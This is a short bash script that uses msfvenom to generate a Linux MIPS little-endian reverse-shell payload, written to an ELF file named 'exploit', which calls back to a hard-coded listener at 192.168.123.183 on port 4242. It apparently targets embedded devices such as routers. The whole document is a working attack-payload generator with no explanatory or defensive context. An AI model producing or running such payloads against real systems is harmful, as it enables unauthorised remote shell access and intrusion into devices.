#!/usr/bin/env bash

LHOST=192.168.123.183
LPORT=4242
PAYLOAD_NAME="exploit"

msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > $PAYLOAD_NAME
